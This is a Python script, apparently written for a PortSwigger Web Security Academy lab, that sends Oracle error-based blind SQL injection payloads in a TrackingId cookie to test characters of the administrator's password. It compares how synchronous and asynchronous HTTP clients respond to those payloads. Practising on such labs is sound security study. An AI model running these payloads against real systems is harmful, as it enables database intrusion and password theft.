import asyncio
import aiohttp
import requests
import time

BASE_URL = "https://0a2d0071033fa28880e0622f006500ac.web-security-academy.net"
FILTER_URL = BASE_URL + "/filter"

def sync_test(payload: str) -> int:
    """同步測試 - 完全按照您的工作版本"""
    session = requests.Session()
    cookies = {
        "TrackingId": "EnCibfUSVeQ634km" + payload,
        "session": "FFmcaPeu7KLoJ3E3u9V4ugtf6kdbK10k"
    }
    
    response = session.get(FILTER_URL, params={"category": "Pets"}, cookies=cookies, timeout=10)
    print(f"SYNC: {response.status_code}")
    return response.status_code

async def async_test(payload: str) -> int:
    """異步測試 - 標準方式"""
    cookies = {
        "TrackingId": "EnCibfUSVeQ634km" + payload,
        "session": "FFmcaPeu7KLoJ3E3u9V4ugtf6kdbK10k"
    }
    
    async with aiohttp.ClientSession() as session:
        async with session.get(FILTER_URL, params={"category": "Pets"}, cookies=cookies, timeout=10) as response:
            print(f"ASYNC: {response.status}")
            return response.status

async def async_test_new_session(payload: str) -> int:
    """異步測試 - 每次新建 session"""
    cookies = {
        "TrackingId": "EnCibfUSVeQ634km" + payload,
        "session": "FFmcaPeu7KLoJ3E3u9V4ugtf6kdbK10k"
    }
    
    connector = aiohttp.TCPConnector(force_close=True, limit=1, limit_per_host=1)
    async with aiohttp.ClientSession(connector=connector) as session:
        async with session.get(FILTER_URL, params={"category": "Pets"}, cookies=cookies, timeout=10) as response:
            print(f"ASYNC_NEW: {response.status}")
            status = response.status
    await connector.close()
    return status

async def test_substr_specifically():
    """專門測試 SUBSTR 相關的 payloads"""
    
    test_cases = [
        # 1. LENGTH 函數 (您說這個沒問題)
        ("LENGTH test", "'||(SELECT CASE WHEN LENGTH(password)>5 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"),
        
        # 2. SUBSTR 對常量 (基礎測試)
        ("SUBSTR constant true", "'||(SELECT CASE WHEN SUBSTR('abc',1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"),
        ("SUBSTR constant false", "'||(SELECT CASE WHEN SUBSTR('abc',1,1)='x' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"),
        
        # 3. SUBSTR 對 password 欄位 (問題所在)
        ("SUBSTR password pos1 'a'", "'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"),
        ("SUBSTR password pos1 'b'", "'||(SELECT CASE WHEN SUBSTR(password,1,1)='b' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"),
        ("SUBSTR password pos1 '0'", "'||(SELECT CASE WHEN SUBSTR(password,1,1)='0' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"),
        
        # 4. 其他字串函數對 password
        ("INSTR password", "'||(SELECT CASE WHEN INSTR(password,'a')=1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"),
        ("LIKE password", "'||(SELECT CASE WHEN password LIKE 'a%' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"),
    ]
    
    print("=== 專門測試 SUBSTR 在同步/異步下的差異 ===\n")
    
    for name, payload in test_cases:
        print(f"🔍 測試: {name}")
        print(f"Payload: {payload[:80]}...")
        print("-" * 100)
        
        # 同步測試
        sync_result = sync_test(payload)
        time.sleep(0.1)
        
        # 異步測試 (重用 session)
        async_result = await async_test(payload)
        await asyncio.sleep(0.1)
        
        # 異步測試 (新建 session)
        async_new_result = await async_test_new_session(payload)
        await asyncio.sleep(0.1)
        
        print(f"結果比較:")
        print(f"  同步 (requests):     {sync_result}")
        print(f"  異步 (重用session):   {async_result} {'✅' if async_result == sync_result else '❌'}")
        print(f"  異步 (新建session):   {async_new_result} {'✅' if async_new_result == sync_result else '❌'}")
        
        # 特別標記 SUBSTR password 的差異
        if "SUBSTR password" in name:
            if sync_result != async_result:
                print(f"  🚨 SUBSTR password 在同步/異步下有差異！")
            if sync_result != async_new_result:
                print(f"  🚨 SUBSTR password 在同步/異步新建session下有差異！")
        
        print("\n" + "="*100 + "\n")
        await asyncio.sleep(0.3)

async def test_timing_hypothesis():
    """測試時序假設 - 是否請求間隔影響 SUBSTR"""
    
    print("=== 測試時序假設 ===\n")
    
    payload = "'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    
    print("1️⃣ 快速連續請求 (異步風格):")
    async with aiohttp.ClientSession() as session:
        for i in range(3):
            result = await async_test(payload)
            print(f"   請求 {i+1}: {result}")
            # 幾乎沒有延遲
    
    print("\n2️⃣ 慢速間隔請求 (同步風格):")
    for i in range(3):
        result = await async_test_new_session(payload)
        print(f"   請求 {i+1}: {result}")
        await asyncio.sleep(0.5)  # 模擬同步的自然延遲
    
    print("\n3️⃣ 同步參考:")
    for i in range(3):
        result = sync_test(payload)
        print(f"   請求 {i+1}: {result}")
        time.sleep(0.5)

async def main():
    await test_substr_specifically()
    await test_timing_hypothesis()

if __name__ == "__main__":
    asyncio.run(main())